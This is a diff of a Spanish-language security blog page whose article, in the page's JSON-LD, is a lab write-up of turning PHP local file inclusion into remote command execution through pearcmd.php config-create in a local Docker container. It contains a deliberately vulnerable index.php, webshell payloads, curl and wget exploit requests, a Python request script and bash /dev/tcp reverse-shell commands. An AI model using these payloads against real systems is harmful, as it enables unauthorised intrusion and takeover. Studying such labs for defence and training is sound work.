@@ -21,51 +21,56 @@
     left: 0;
     width: 100%;
     height: 100%;
-    background-image: linear-gradient(rgba(0, 0, 0, 0.65), rgba(0, 0, 0, 0.5)), url('/images/back1.jpeg');
+<!--
+    background-image: linear-gradient(rgba(0, 0, 0, 0.12), rgba(0, 0, 0, 0.5)), url('/images/back1.jpeg_');    
     background-size: cover;
     background-position: center;
+-->
     z-index: -1;
   }
 </style>
 	
-<meta name="author" content="m4xth0r"><meta name="description" content="Cybersecurity expert,Cloud, AD, VMs">
+<meta name="author" content="Maximiliano Belino"><meta name="description" content="LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.">
 
-  <meta itemprop="name" content="Secondpost">
-  <meta itemprop="description" content="Este post es en español">
+  <meta itemprop="name" content="Vulnerabilidad en PHP hasta 7.3. LFI to RCE">
+  <meta itemprop="description" content="LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.">
   <meta itemprop="datePublished" content="2024-11-27T15:23:13-03:00">
   <meta itemprop="dateModified" content="2024-11-27T15:23:13-03:00">
-  <meta itemprop="wordCount" content="5">
-  <meta itemprop="keywords" content="Test"><meta property="og:url" content="https://maxibelino.github.io/es/posts/secondpost/">
-  <meta property="og:site_name" content="Dominando la Ciberseguridad">
-  <meta property="og:title" content="Secondpost">
-  <meta property="og:description" content="Este post es en español">
+  <meta itemprop="wordCount" content="2202">
+  <meta itemprop="keywords" content="LFI,Php,RCE,Vulnerability"><meta property="og:url" content="https://maxibelino.github.io/es/posts/secondpost/">
+  <meta property="og:site_name" content="m4xth0r ~ Aliados en Ciberseguridad">
+  <meta property="og:title" content="Vulnerabilidad en PHP hasta 7.3. LFI to RCE">
+  <meta property="og:description" content="LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2024-11-27T15:23:13-03:00">
     <meta property="article:modified_time" content="2024-11-27T15:23:13-03:00">
-    <meta property="article:tag" content="Test">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="Php">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="Vulnerability">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Secondpost">
-  <meta name="twitter:description" content="Este post es en español">
+  <meta name="twitter:title" content="Vulnerabilidad en PHP hasta 7.3. LFI to RCE">
+  <meta name="twitter:description" content="LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.">
 
 <script type="application/ld+json">
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "headline": "Secondpost",
-    "name": "Secondpost",
-    "description": "Este post es en español",
-    "keywords": ["test"],
-    "articleBody": "Este post es en español\n",
-    "wordCount" : "5",
+    "headline": "Vulnerabilidad en PHP hasta 7.3. LFI to RCE",
+    "name": "Vulnerabilidad en PHP hasta 7.3. LFI to RCE",
+    "description": "LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.",
+    "keywords": ["LFI", "php", "RCE", "vulnerability"],
+    "articleBody": "John Hammond Youtube video 1\n1. Objetivo Vamos a probar como un LFI nos llevará a un RCE vía una vulnerabilidad de PHP.\nEl problema existe hasta la versión PHP 7.3 y esto fue reportado en el año 2021.\nLa página está en otro idioma y John H. la ha traducido con Google al Inglés. Este documento lo he armado en base a su vídeo en Youtube.\n1.1. Laboratorio local Para hacer las pruebas nos vamos a crear una imagen que cuente con PHP, con esta crearemos un contenedor Docker que contenga una página con un LFI.\nLuego, abusaremos de un .php que existe por defecto y es una especie de consola, y según los parámetros que le demos ejecutará distintos comandos, por ejemplo nos permite crear archivos, por lo cual podremos crear archivos con extensión .php que luego al solicitar con el navegador nos permitirá crear una webshell.\nNormalmente usamos técnicas de log poisoning para ir de un LFI a RCE, este no es el caso.\n{width=“5.338542213473316in” height=“1.4188812335958005in”}\n1.2. Blog de origen {width=“5.411458880139983in” height=“2.2922287839020123in”}\nhttps://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html\nTraducción:\nhttps://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto\u0026_x_tr_tl=en\u0026_x_tr_hl=es-419\u0026_x_tr_pto=wapp\nLo interesante viene acá:\nhttps://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\n1.2.1 Autor en twitter (X) {width=“4.057292213473316in” height=“2.284753937007874in”}\n2. Creando nuestro Laboratorio Local Para poder hacer las pruebas en un laboratorio local necesitamos:\nCrear un contenedor\nCrear algunos archivos para testear\n2.1. Archivos y contenedores Con nuestro Dockerfile crearemos una imagen y a partir de esta crearemos contenedores Docker (con 1 solo nos alcanza).\nArchivo: Dockerfile\nFROM php:7.0.0 COPY app/* /var/www/html/ WORKDIR /var/www/html/ CMD [\"php\", \"-S\", \"0.0.0.0:8000\"] En el index.php generamos la vulnerabilidad, usaremos include para poder tener LFI.\nArchivo: index.php\n\u003c?php if ( isset($_GET['file']) ){ include($_GET['file']); } ?\u003e Archivo: phpinfo.php\n\u003c?php phpinfo(); ?\u003e Creamos el dir app/ y movemos los archivos .php al mismo:\n{width=“5.026042213473316in” height=“4.259200568678915in”}\n2.2. Contenedor 2.2.1. Build de la imagen desde nuestro Dockerfile Usaremos el tag = LFi 2 RCE → phplfi2rce\ndocker build -t phplfi2rce . (hay un punto al final del comando indicando el directorio actual)\n{width=“4.584385389326334in” height=“1.0866688538932634in”}\nHacemos el build\n{width=“4.652179571303587in” height=“3.7217432195975504in”}\nListamos las imágenes Docker disponibles localmente:\ndocker images {width=“6.267716535433071in” height=“1.125in”}\n2.2.2. Iniciamos un contenedor desde la imagen que hemos creado Iniciar el contenedor-\ndocker run -p 8000:8000 phplfi2rce 2.2.3. Probamos el servicio en el puerto 8000 Visitamos nuestra página vulnerable index.php\n{width=“4.760416666666667in” height=“1.71875in”}\n2.2.4. Comprobamos el LFI Probamos el Local File Inclusion con el archivo /etc/passwd\nURL:\nhttp://127.0.0.1:8000/index.php?file=/etc/passwd O lo que es lo mismo:\nhttp://localhost:8000/?file=/etc/passwd {width=“5.526042213473316in” height=“1.578869203849519in”}\nEn la consola vemos:\n{width=“6.267716535433071in” height=“0.9444444444444444in”}\n2.2.5. Accedemos al phpinfo.php Visitamos la página del phpinfo.php\nhttp://localhost:8000/phpinfo.php {width=“6.267716535433071in” height=“3.3194444444444446in”}\n3. Variables argc y argv En la página del phpinfo.php, busquemos por las variables que hace referencia el blog (argc y argv)\nargc → contar argumentos\nargv → valores de los argumentos\n{width=“6.267716535433071in” height=“0.2777777777777778in”}\nLa siguiente es un array:\n{width=“6.267716535433071in” height=“0.7777777777777778in”}\nSi en la URL le pasamos después del signo de pregunta ‘?’ un texto como “cualquiercosa” lo veremos reflejado en el array.\n{width=“6.267716535433071in” height=“2.2083333333333335in”}\nEsta es la petición que llega al servidor web (un server PHP en el contenedor):\n{width=“6.267716535433071in” height=“0.4305555555555556in”}\n3.1. Qué ha sucedido El blog (traducido al inglés) explica lo siguiente:\nSi en la URL ponemos un texto, lo vemos reflejado en la página del phpinfo, es decir el texto que escribimos se está cargando en el contenido del array $_SERVER[‘argv’].\nEso significa que: “hemos visitado la función del pearcmd.php a través de la web y hemos sido capaces de controlar los parámetros enviados a la línea de comandos.” 4. Acerca del archivo pearcmd.php 4.1. Cuál es la idea Obs Una vez más, leer lo anterior, donde dice “Qué ha sucedido”. Si hacemos LFI de ese archivo pearcmd.php se invocará, es decir, se va a interpretar, pues tiene extensión PHP; y lo interesante es que a ese archivo le podemos pasar una lista de argumentos (de los que tiene habilitados el archivo), que podremos controlar a través del output que vemos en el array visto en el phpinfo.\nAl escribir la salida del array (que vemos en el phpinfo) estamos escribiendo o eligiendo los argumentos que va a tomar el pearcmd.php. El archivo pearcmd.php está en la ruta: /usr/local/lib/php\nSe invoca ejecutando:\nphp pearcmd.php 4.2. Veamos el archivo desde dentro del contenedor 4.2.1. Entrar al contenedor Primero obtenemos el ID del contenedor\n{width=“6.267716535433071in” height=“1.0833333333333333in”}\nEntramos al contenedor\ndocker exec -it /bin/bash En mi máquina:\n{width=“5.557292213473316in” height=“1.9201268591426073in”}\nYa dentro del contenedor, listamos el directorio:\n{width=“5.567708880139983in” height=“0.4817322834645669in”}\n4.2.2. Comandos que puede ejecutar el pearcmd.php A este php lo podemos invocar usando el comando:\nphp La salida es la lista de comandos/argumentos que puede tomar: {width=“6.267716535433071in” height=“2.611111111111111in”}\nObservar esta opción en particular:\n{width=“6.267716535433071in” height=“0.2916666666666667in”}\n4.2.3. Código fuente del pearcmd.php Si nos copiamos el código fuente del pearcmd.php\n{width=“6.267716535433071in” height=“3.6944444444444446in”}\n4.2.4. Análisis del config-create El autor del blog analiza el código del config-create y dice:\n{width=“6.239583333333333in” height=“1.6979166666666667in”}\nEl config-create necesita de 2 argumentos o parámetros:\nel segundo parámetro es el nombre del archivo con el file path que se va a escribir (llamémosle “pepe”, entonces /file/path/a/pepe)\nel primer parámetro será el contenido de lo que se escribe dentro del archivo “pepe”. Es decir, a través de pearcmd.php podemos crear un nuevo archivo (por ejemplo con extensión .php) con el contenido que queramos.\n5. Ejecución de pearcmd.php En el blog, el autor usa un HTTP GET para realizar el request (John H. crea con este código un request en Python).\nTenemos que usar el parámetro file que es el con el que tenemos LFI y los dos parámetros que necesita “config-create”:\n{width=“6.267716535433071in” height=“1.875in”}\nEl LFI invoca a través de “file” al pearcmd.php\nSubrayado en rojo el contenido a escribir\nSubrayado en celeste el archivo de salida.\n5.1. Opción 1 - Utilizar el navegador para hacer el request y crear un archivo dentro del contenedor Crearemos un archivo .php dentro del contenedor.\nLa URL a visitar es:\nhttp://127.0.0.1:8000/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\u003c?=phpinfo()?\u003e+/tmp/hello.php {width=“6.267716535433071in” height=“1.4861111111111112in”}\nEl mensaje es de éxito.\nVerificamos si se creó el archivo en el /tmp/hello.php dentro del contenedor:\n{width=“5.447916666666667in” height=“1.2395833333333333in”}\n→ ok, tenemos el archivo hello.php dentro del contenedor\nVeamos el contenido:\n{width=“5.177083333333333in” height=“1.5729166666666667in”}\n6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos Vamos a hacer una primera prueba que es crear el archivo test.php directamente en el directorio /tmp/ del contenedor:\nestando en una consola del contenedor\nsin usar el config-create del pearcmd.php\nEntonces:\nCreamos el archivo test.php que ejecuta el comando ls En el contenedor, ejecutamos:\necho \"\u003c?php system('ls -l') ?\u003e\" \u003e test.php {width=“6.267716535433071in” height=“0.25in”}\nVisitamos la página:\n{width=“6.267716535433071in” height=“1.0138888888888888in”}\n→ ok, se ejecutó el ’ls’\n6.1. Comandos de sistema Creamos el archivo test.php que ejecuta cualquier comando de sistema a través de una variable ‘c’ En el contenedor, ejecutamos:\necho \"\u003c?php system(\\$_GET['c']) ?\u003e\"\u003e test.php {width=“6.267716535433071in” height=“1.1666666666666667in”}\nObs: hay que escapar el símbolo de pesos con una contrabarra (backslash).\nAhora hacemos uso del LFI, invocamos al archivo test.php, y a ‘c’ le damos el valor ‘id’:\nindex.php?file=/tmp/test.php\u0026c=id {width=“6.270833333333333in” height=“1.343814523184602in”}\n→ ok, obtenemos el resultado de ejecutar el comando ‘id’\n6.2. Reverse shell Con lo anterior podemos ejecutar una reverse shell (usando la variable ‘c’ que espera el archivo test.php) En Kali abrimos un listener con nc, y luego la URL a visitar en el navegador es:\nhttp://127.0.0.1:8000/index.php?file=/tmp/test.php\u0026c=bash -c \\\"bash -i\u003e%26 /dev/tcp/172.17.0.1/443 0\u003e%261\" {width=“6.267716535433071in” height=“1.0in”}\nVemos en la imagen anterior que recibimos una conexión entrante en el listener.\nEstamos en el contenedor:\n{width=“6.267716535433071in” height=“2.75in”}\n7. Repetimos y creamos el archivo ahora haciendo uso del LFI Crearemos el archivo en el contenedor usando el LFI que invocará a config-create de pearcmd.php.\nEs decir, ahora queremos hacer lo mismo que hicimos antes, pero:\nUtilizando el config-create del pearcmd.php\nDesde fuera del contenedor\nAhora vamos a escribir un archivo llamado test2.php.\nTenemos que escribir la cadena:\n\u003c?php system(\\$_GET['c']) ?\u003e en el archivo test2.php\n!! Si queremos usar el navegador para crear el archivo es posible que nos dé problemas: FAIL Al mandarlo vía la URL del navegador se nos complica, porque los signos de mayor y menor los convierte a código url.\nAlgunos intentos:\nhttp://127.0.0.1:8000/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\\\u003c?=system(\\$\\_GET\\[\\'c\\'\\])?\\\u003e+/tmp/test2.php http://127.0.0.1:8000/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\\\u003c?=system(id);?\\\u003e+/tmp/test2.php En el log del servidor web del contenedor, vemos que los símbolos no llegan de forma correcta:\n{width=“6.267716535433071in” height=“0.375in”}\n7.1. Usaremos curl para crear el archivo En vez de usar el navegador para visitar la URL que usa el config-create y crea el archivo, usemos el comando curl.\n7.1.1. Primer test, ejecución del comando ‘id’ curl -s -X GET \\'http://127.0.0.1:8000/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/**\\\u003c?=system(id);?\\\u003e**+/tmp/test2.php\\' {width=“6.267716535433071in” height=“0.3611111111111111in”}\n{width=“6.267716535433071in” height=“2.4027777777777777in”}\n{width=“6.267716535433071in” height=“1.25in”}\n→ Nos dice que se creó al archivo /tmp/test2.php\nEn el log, vemos que llega bien (el request, la cadena de texto) al web server del contenedor:\n{width=“6.267716535433071in” height=“0.2777777777777778in”}\nY si luego solicitamos la URL con el navegador usando file=/tmp/test2.php vemos que se ejecuta de forma correcta y nos da la salida del comando ‘id’ como esperábamos:\n{width=“6.267716535433071in” height=“0.8611111111111112in”}\n7.1.2. Hagamos un nuevo archivo con parámetro ‘c’ Podríamos crear el test2.php con el código necesario de una web shell, usando curl:\ncurl -s -X GET 'http://127.0.0.1:8000/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\\\u003c?=system(\\$\\_GET\\\\\\[\\\"c\\\"\\\\\\])?\\\u003e+/tmp/test2.php' {width=“6.267716535433071in” height=“0.2777777777777778in”}\nObservar que se deben escapar los paréntesis rectos, y además intercambiar las comillas, afuera ponemos las simples y en el GET las dobles.\nEl log del web server en el contenedor:\n{width=“6.267716535433071in” height=“0.2638888888888889in”}\n7.1.2.1. Ejecución de comandos Mediante el LFI, al igual que antes, llamaremos al archivo .php que ya creamos y le daremos en el parámetro ‘c’ el comando de sistema a ejecutar.\nComando ‘whoami’\n{width=“6.267716535433071in” height=“1.75in”}\n→ ok, hemos ejecutado el comando ‘whoami’ de forma correcta\nComando ‘id’\n{width=“6.267716535433071in” height=“1.4861111111111112in”}\n7.1.2.2. Reverse shell Ya tenemos el archivo test2.php que mediante la variable ‘c’ ejecutará un comando de sistema.\nComo comando de sistema ahora podemos incluir el código necesario para que nos devuelva una reverse shell.\nEn vez de usar el navegador, podemos llamar usar wget:\nwget \\'http://127.0.0.1:8000/index.php?file=/tmp/test2.php**\u0026c=**bash -c \"bash -i \\\u003e%26 /dev/tcp/172.17.0.1/443 0\\\u003e%261\\\"' Al ejecutar el wget:\n{width=“6.267716535433071in” height=“0.7777777777777778in”}\nEn el listener recibimos la conexión desde nuestro contenedor de pruebas:\n{width=“6.267716535433071in” height=“1.2361111111111112in”}\nYa dentro del contenedor podemos realizar el análisis que queramos.\n{width=“5.815553368328959in” height=“3.526042213473316in”}\n8. Usemos un script python (en vez de curl) para crear el archivo (.php) La idea es crear un script en Python (hack.py) para hacer el GET request y así crear el archivo de extensión .php (al que luego podremos llamar mediante el LFI).\nTomaremos el código sugerido en el blog y le consultamos a Chat GPT cómo hacer el request en Python:\n{width=“6.267716535433071in” height=“2.9583333333333335in”}\nGET /index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\\\u003c?=phpinfo()?\\\u003e+/tmp/hello.php HTTP/1.1 Host: 192.168.1.162:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close “Please give me Python syntax to send this raw HTTP request.”\n{width=“6.267716535433071in” height=“4.763888888888889in”}\nCódigo python sugerido por ChatGPT:\nimport requests url='http://192.168.1.162:8080/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\\\u003c?=phpinfo()?\\\u003e+/tmp/hello.php' headers = { 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Accept-Language': 'en', 'User-Agent\\': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36','Connection': 'close' } response = requests.get(url, headers=headers) print(response.text) → este código será modificado\nNos hacemos el archivo hack.py con el código sugerido por Chat GPT para ejecutar el GET request con python:\n{width=“6.267716535433071in” height=“2.3333333333333335in”}\nPERO: en vez de escribir el phpinfo() en el /tmp/hello.php {width=“4.057292213473316in” height=“0.4747889326334208in”}\n→ escribimos otro texto para verificar simplemente:\n{width=“5.088542213473316in” height=“0.47335301837270344in”}\n(el signo de + actúa como espacio)\n8.1. Testing usando nuestro hack.py Dentro del contenedor podemos ver que en el /tmp/ no tenemos más que el archivo pear:\n{width=“3.963542213473316in” height=“0.672230971128609in”}\nSi ejecutamos el archivo Python:\npython3 hack.py Vemos que en el log se vé el GET:\n{width=“6.267716535433071in” height=“1.4583333333333333in”}\nY si revisamos el contenido del directorio /tmp:\n{width=“4.296875546806649in” height=“1.232024278215223in”}\n→ Se creó el hello.php que ahora podremos invocar usando nuestro LFI → se ejecutará (se interpreta) pues es un .php\n{width=“6.267716535433071in” height=“0.9722222222222222in”}\nEn este caso tiene un error en el echo, igualmente vemos que sí se ejecutó bien.\n8.2. Ejecución remota de comandos Podemos modificar el hack.py para que ejecute un comando de sistema, que se lo pasaremos en la URL mediante una variable ‘c’:\n{width=“6.267716535433071in” height=“2.263888888888889in”}\nLo ejecutamos de nuevo para generar un nuevo hello.php:\npython3 hack.py Volvemos a listar en el contenedor en el /tmp:\n{width=“4.713542213473316in” height=“0.4614654418197725in”}\nSi le hacemos un cat al hello.php:\n{width=“6.267716535433071in” height=“1.3194444444444444in”}\nY si vamos al navegador, veremos:\n{width=“6.267716535433071in” height=“0.7222222222222222in”}\nTenemos un Warning pues no le hemos pasado el valor, es decir el comando, a la variable ‘c’:\n8.2.1. Ejecutemos el comando id En la url tenemos que usar el LFI para invocar al archivo hello.php.\nhttp://localhost:8000/?file=/tmp/hello.php\u0026c=id {width=“6.267716535433071in” height=“0.6666666666666666in”}\nYa tenemos ejecución de comandos y si queremos podemos ejecutar una reverse shell.\n8.2.2. Ganar acceso Nuestra IP de Docker:\n{width=“3.401042213473316in” height=“0.9051159230096238in”}\nVamos a la web de revshells.com\n{width=“5.296875546806649in” height=“3.862671697287839in”}\nVamos a copiar esa cadena con el comando, la ejecutaremos con bash pero se la daremos codificada en base64:\n{width=“6.267716535433071in” height=“1.0416666666666667in”}\nListener con netcat en el puerto 8888:\n{width=“2.6406255468066493in” height=“0.7109372265966755in”}\n8.2.2.1. Reverse shell en el hack.py Nos copiamos el código en base64 para tenerlo guardado, o a la vista:\n{width=“6.267716535433071in” height=“0.5277777777777778in”}\nCreamos una nueva conexión:\n{width=“6.267716535433071in” height=“2.236111111111111in”}\nEjecutamos de nuevo el hack.py\n{width=“2.4114588801399823in” height=“0.48229221347331586in”}\npero da un error\n{width=“5.390625546806649in” height=“0.9760433070866141in”}\n→ al parecer no le gustan los espacios\nPrueba con un ‘+’ para evitar el espacio en blanco pero tampoco funciona\n{width=“6.267716535433071in” height=“0.6666666666666666in”}\n→ vamos a hacerlo con urlencode; importamos la librería urllib.parse\n{width=“3.026042213473316in” height=“1.2087937445319334in”}\n{width=“6.267716535433071in” height=“0.6527777777777778in”}\nEjecutamos de nuevo el hack.py y recibimos la reverse shell:\n{width=“3.369792213473316in” height=“1.618561898512686in”}\nSomos root:\n{width=“4.421875546806649in” height=“0.5537828083989501in”}\n{width=“4.380208880139983in” height=“1.3986515748031496in”}\nYoutube: John Hammond Youtube video ↩︎\n",
+    "wordCount" : "2202",
     "inLanguage": "es",
     "datePublished": "2024-11-27T15:23:13-03:00",
     "dateModified": "2024-11-27T15:23:13-03:00",
     "author":{
         "@type": "Person",
-        "name": "m4xth0r",
+        "name": "Maximiliano Belino",
         "url": "https://maxibelino.github.io/es/about/"
         },
     "mainEntityOfPage": {
@@ -74,7 +79,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Dominando la Ciberseguridad",
+      "name": "m4xth0r ~ Aliados en Ciberseguridad",
       "description": "Cybersecurity expert,Cloud, AD, VMs",
       "logo": {
         "@type": "ImageObject",
@@ -82,7 +87,7 @@
       }
     }
 }
-</script><title>Secondpost</title>
+</script><title>Vulnerabilidad en PHP hasta 7.3. LFI to RCE</title>
 <link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="https://maxibelino.github.io/css/style.min.d9b0ab8d219199281feaa0cbeb12a26e6ab6909f7c0ad9efe09f4a6daac61311.css" integrity="sha256-2bCrjSGRmSgf6qDL6xKibmq2kJ98Ctnv4J9KbarGExE=" crossorigin="anonymous">
 	</head>
 <body id="page">
@@ -90,12 +95,20 @@
 		<div class="hdr-wrapper section-inner">
 			<div class="hdr-left">
 				<div class="site-branding">
-					<a href="/es/">Dominando la Ciberseguridad</a>
+					<a href="/es/">m4xth0r ~ Aliados en Ciberseguridad</a>
 				</div>
 				<nav class="site-nav hide-in-mobile"><a href="https://maxibelino.github.io/es/services/">Descubre nuestros servicios</a><a href="https://maxibelino.github.io/es/research/">Investigación</a><a href="https://maxibelino.github.io/es/posts/">Publicaciones</a><a href="https://maxibelino.github.io/es/about/">Acerca</a></nav>
 			</div>
 			<div class="hdr-right hdr-icons">
-				<span class="hdr-links hide-in-mobile"><a href="mailto:max.cybersecurity@belino.com" target="_blank" rel="noopener me" title="Mail"><svg xmlns="http://www.w3.org/2000/svg" class="feather feather-link" width="24" height="24" viewBox="0 0 24 24"
+				<button id="toc-btn" class="hdr-btn desktop-only-ib" title="Tabla de Contenido"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list">
+      <line x1="8" y1="6" x2="21" y2="6"></line>
+      <line x1="8" y1="12" x2="21" y2="12"></line>
+      <line x1="8" y1="18" x2="21" y2="18"></line>
+      <line x1="3" y1="6" x2="3" y2="6"></line>
+      <line x1="3" y1="12" x2="3" y2="12"></line>
+      <line x1="3" y1="18" x2="3" y2="18"></line>
+   </svg></button><span class="hdr-links hide-in-mobile"><a href="mailto:max.cybersecurity@belino.com" target="_blank" rel="noopener me" title="Mail"><svg xmlns="http://www.w3.org/2000/svg" class="feather feather-link" width="24" height="24" viewBox="0 0 24 24"
       fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
       <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
       <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
@@ -128,7 +141,7 @@
     
     <ul>
         <li>
-            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f&amp;text=Secondpost" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f&amp;text=Vulnerabilidad%20en%20PHP%20hasta%207.3.%20LFI%20to%20RCE" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
 </svg></a>
@@ -140,14 +153,14 @@
 </svg></a>
         </li>
         <li>
-            <a href="mailto:?subject=Secondpost&amp;body=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            <a href="mailto:?subject=Vulnerabilidad%20en%20PHP%20hasta%207.3.%20LFI%20to%20RCE&amp;body=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
    <polyline points="22,6 12,13 2,6"></polyline>
 </svg></a>
         </li>
         <li>
-            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f&amp;source=https%3a%2f%2fmaxibelino.github.io%2f&amp;title=Secondpost&amp;summary=Secondpost%2c%20by%20m4xth0r%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmaxibelino.github.io%2fes%2fposts%2fsecondpost%2f&amp;source=https%3a%2f%2fmaxibelino.github.io%2f&amp;title=Vulnerabilidad%20en%20PHP%20hasta%207.3.%20LFI%20to%20RCE&amp;summary=Vulnerabilidad%20en%20PHP%20hasta%207.3.%20LFI%20to%20RCE%2c%20by%20Maximiliano%20Belino%0a%0aLFI%20to%20RCE%20%3d%20Local%20File%20Inclusion%20to%20Remote%20Command%20Execution.%20Based%20on%20John%20Hammond%20Youtube%20video.%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
@@ -155,7 +168,7 @@
 </svg></a>
         </li>
         <li>
-            <a href="#" onclick="linkShare(&#34;Secondpost&#34;,&#34;https://maxibelino.github.io/es/posts/secondpost/&#34;,&#34;Secondpost, by m4xth0r\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+            <a href="#" onclick="linkShare(&#34;Vulnerabilidad en PHP hasta 7.3. LFI to RCE&#34;,&#34;https://maxibelino.github.io/es/posts/secondpost/&#34;,&#34;Vulnerabilidad en PHP hasta 7.3. LFI to RCE, by Maximiliano Belino\n\nLFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
       stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
       <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
       <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
@@ -184,19 +197,19 @@
 	<main class="site-main section-inner animated fadeIn faster"><article class="thin">
 			<header class="post-header">
 				<div class="post-meta"><span>Nov 27, 2024</span></div>
-				<h1>Secondpost</h1>
+				<h1>Vulnerabilidad en PHP hasta 7.3. LFI to RCE</h1>
 			</header>
-			<div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+			<div class="post-info"><p>LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
    stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather">
    <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path>
    <line x1="16" y1="8" x2="2" y2="22"></line>
    <line x1="17.5" y1="15" x2="9" y2="15"></line>
-</svg><a href="/es/about/" target="_blank">m4xth0r</a></p>
+</svg><a href="/es/about/" target="_blank">Maximiliano Belino</a></p>
 <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
       stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
